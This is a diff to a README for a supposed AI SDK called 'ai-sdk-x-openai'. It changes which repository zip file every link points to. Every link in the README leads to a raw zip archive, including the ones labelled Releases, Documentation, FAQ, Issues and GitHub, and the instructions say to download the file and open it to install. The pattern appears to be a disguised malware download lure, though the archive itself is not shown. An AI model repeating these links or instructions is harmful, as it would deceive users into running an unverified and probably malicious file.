@@ -1,6 +1,6 @@
 # 🌟 ai-sdk-x-openai - Simplify AI Integration for Your Apps
 
-[![Download](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip)](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip)
+[![Download](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip)](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to ai-sdk-x-openai! This tool helps you integrate AI features into your 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip) to download the latest version of the ai-sdk-x-openai package.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip) to download the latest version of the ai-sdk-x-openai package.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip).
 2. Look for the latest version.
 3. Click the download link to save the file to your computer.
 4. Once downloaded, open the file to install the application on your device.
@@ -19,7 +19,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Reyy
 
 - Easy setup for AI functionalities.
 - Supports both JSON and structured outputs.
-- Built on https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip and React for seamless integration.
+- Built on https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip and React for seamless integration.
 - TypeScript support for type safety.
 - Streaming capabilities for real-time responses.
 
@@ -44,14 +44,14 @@ After you install ai-sdk-x-openai, follow these steps to start using it:
 
 ## 📚 Documentation
 
-For detailed instructions, please refer to the user manual provided in the application or visit the [Documentation](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip) section for more help and examples.
+For detailed instructions, please refer to the user manual provided in the application or visit the [Documentation](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip) section for more help and examples.
 
 ## 🤝 Community and Support
 
 If you face any issues or have questions, don't hesitate to reach out to the community:
 
-- Check out the [FAQ](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip) for common queries.
-- Join discussions in the [Issues](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip) section of this repository.
+- Check out the [FAQ](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip) for common queries.
+- Join discussions in the [Issues](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip) section of this repository.
 
 ## 🌈 Contributions
 
@@ -68,7 +68,7 @@ ai-sdk-x-openai is available under the MIT License. You can use, modify, and dis
 
 ## 🔗 More Links
 
-- Visit the [Releases page](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip) to download the latest version.
-- Explore the project on [GitHub](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/hippocampine/ai-sdk-x-openai.zip).
+- Visit the [Releases page](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip) to download the latest version.
+- Explore the project on [GitHub](https://raw.githubusercontent.com/Reyyy555/ai-sdk-x-openai/main/public/assets/x_ai_sdk_openai_1.9.zip).
 
 Embrace the future of AI with ai-sdk-x-openai!
